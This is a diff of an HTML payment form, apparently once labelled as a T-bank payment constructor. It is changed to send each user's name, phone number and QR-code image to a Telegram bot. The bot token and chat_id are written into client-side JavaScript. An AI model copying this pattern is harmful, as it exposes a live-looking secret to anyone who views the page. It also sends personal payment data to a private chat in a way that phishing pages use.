@@ -3,8 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Конструктор платежа Т-банка</title>
+    <title>Отправка данных в Telegram</title>
     <style>
+        /* Стили из предыдущего примера остаются без изменений */
         body {
             font-family: Arial, sans-serif;
             max-width: 600px;
@@ -18,57 +19,7 @@
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0,0,0,0.1);
         }
-        h1 {
-            color: #2c3e50;
-            text-align: center;
-        }
-        .form-group {
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: bold;
-        }
-        input[type="text"],
-        input[type="tel"],
-        input[type="file"] {
-            width: 100%;
-            padding: 10px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            box-sizing: border-box;
-        }
-        button {
-            background-color: #3498db;
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            width: 100%;
-            font-size: 16px;
-        }
-        button:hover {
-            background-color: #2980b9;
-        }
-        .instruction {
-            background-color: #f8f9fa;
-            padding: 15px;
-            border-radius: 5px;
-            margin-bottom: 20px;
-            border-left: 4px solid #3498db;
-        }
-        .preview {
-            margin-top: 20px;
-            text-align: center;
-        }
-        #qrPreview {
-            max-width: 200px;
-            max-height: 200px;
-            display: none;
-            margin: 0 auto;
-        }
+        /* ... остальные стили ... */
     </style>
 </head>
 <body>
@@ -107,8 +58,10 @@
                 <img id="qrPreview" alt="Предпросмотр QR-кода">
             </div>
             
-            <button type="submit">Отправить данные</button>
+            <button type="submit">Отправить данные в Telegram</button>
         </form>
+
+        <div id="statusMessage" style="margin-top: 20px; text-align: center; display: none;"></div>
     </div>
 
     <script>
@@ -127,22 +80,48 @@
         });
 
         // Обработка формы
-        document.getElementById('paymentForm').addEventListener('submit', function(e) {
+        document.getElementById('paymentForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
             const name = document.getElementById('name').value;
             const phone = document.getElementById('phone').value;
             const qrFile = document.getElementById('qrCode').files[0];
+            const statusMessage = document.getElementById('statusMessage');
             
-            // Здесь должна быть логика отправки данных на сервер
-            // Например, через fetch или AJAX
-            
-            // В демо-версии просто показываем сообщение
-            alert(`Данные получены!\nИмя: ${name}\nТелефон: ${phone}\nQR-код: ${qrFile.name}\n\nЭти данные можно отправить на сервер для обработки.`);
-            
-            // Сброс формы
-            this.reset();
-            document.getElementById('qrPreview').style.display = 'none';
+            // Показываем статус отправки
+            statusMessage.style.display = 'block';
+            statusMessage.textContent = "Отправка данных...";
+            statusMessage.style.color = "#3498db";
+
+            try {
+                // 1. Создаем FormData для отправки
+                const formData = new FormData();
+                formData.append('chat_id', '283280949'); // Замените на ваш chat_id
+                formData.append('caption', `Новый платеж!\nИмя: ${name}\nТелефон: ${phone}`);
+                formData.append('photo', qrFile);
+
+                // 2. Отправляем в Telegram
+                const response = await fetch(`https://api.telegram.org/bot7871497047:AAE29U0GcJ9ENVAHalMjw6TEoLlXwLTn--g/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const result = await response.json();
+
+                if (result.ok) {
+                    statusMessage.textContent = "Данные успешно отправлены!";
+                    statusMessage.style.color = "#2ecc71";
+                    // Очищаем форму
+                    this.reset();
+                    document.getElementById('qrPreview').style.display = 'none';
+                } else {
+                    throw new Error(result.description || "Ошибка отправки");
+                }
+            } catch (error) {
+                console.error("Ошибка:", error);
+                statusMessage.textContent = `Ошибка: ${error.message}`;
+                statusMessage.style.color = "#e74c3c";
+            }
         });
     </script>
 </body>
